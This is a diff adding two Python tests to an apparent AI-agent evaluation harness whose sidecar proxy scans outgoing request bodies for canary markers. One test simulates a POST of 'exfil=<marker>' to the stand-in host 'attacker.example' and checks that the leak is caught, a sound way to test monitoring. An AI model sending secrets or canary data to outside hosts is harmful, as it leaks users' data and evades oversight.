@@ -21,6 +21,7 @@ from bellwether.capture import (
     SidecarConfig,
     block_response_args,
     build_addon,
+    mint_canaries,
 )
 from bellwether.capture.proxy_addon import BlockResponse, read_flow_records
 from bellwether.capture.sidecar_entry import CONFIG_ENV_VAR, load_addon_from_env
@@ -117,6 +118,54 @@ def test_the_config_round_trips_through_json() -> None:
 def test_the_config_json_is_canonical_and_stable() -> None:
     config = _config(_host_broker(), "/shared/flows.jsonl")
     assert config.to_json() == config.to_json()
+
+
+def test_the_config_round_trips_canary_markers() -> None:
+    """The host writes the run's ``(id, marker)`` pairs into the config on the shared volume; the
+    sidecar reads them back to scan bodies (§10.5.2). They round-trip byte-stably like the rest."""
+    canaries = mint_canaries(7)
+    base = _config(_host_broker(), "/shared/flows.jsonl")
+    config = SidecarConfig(
+        provider_endpoints=base.provider_endpoints,
+        infrastructure_endpoints=base.infrastructure_endpoints,
+        allowlist_extra=base.allowlist_extra,
+        provider_of_host=base.provider_of_host,
+        credential_export=base.credential_export,
+        max_requests=base.max_requests,
+        max_request_bytes=base.max_request_bytes,
+        flow_log_path=base.flow_log_path,
+        canary_markers=tuple((c.id, c.marker) for c in canaries),
+    )
+    assert SidecarConfig.from_json(config.to_json()) == config
+
+
+def test_build_addon_scans_a_body_for_the_configs_canaries() -> None:
+    """The sidecar rebuilds the canaries from its config and scans each body — the end of the wire
+    that catches POST-body exfil to a non-model host (§10.5.2)."""
+    canaries = mint_canaries(7)
+    host = _host_broker()
+    config = SidecarConfig(
+        provider_endpoints=("api.anthropic.com",),
+        infrastructure_endpoints=("telemetry.example-harness.com",),
+        allowlist_extra=("attacker.example",),
+        provider_of_host={"api.anthropic.com": "anthropic"},
+        credential_export=host.sidecar_export(),
+        max_requests=100,
+        max_request_bytes=1_000_000,
+        flow_log_path="/shared/flows.jsonl",
+        canary_markers=tuple((c.id, c.marker) for c in canaries),
+    )
+    addon = build_addon(config, _HOST_ENVIRON, clock=lambda: _TS)
+    addon.on_request(
+        _FakeRequest(
+            pretty_host="attacker.example",
+            path="/collect",
+            content=f"exfil={canaries[0].marker}".encode(),
+        )
+    )
+    hits = addon.flows()[0].canary_hits
+    assert [h.canary_id for h in hits] == [canaries[0].id]
+    assert hits[0].destination == "other_host"
 
 
 # ---------------------------------------------------------------------------
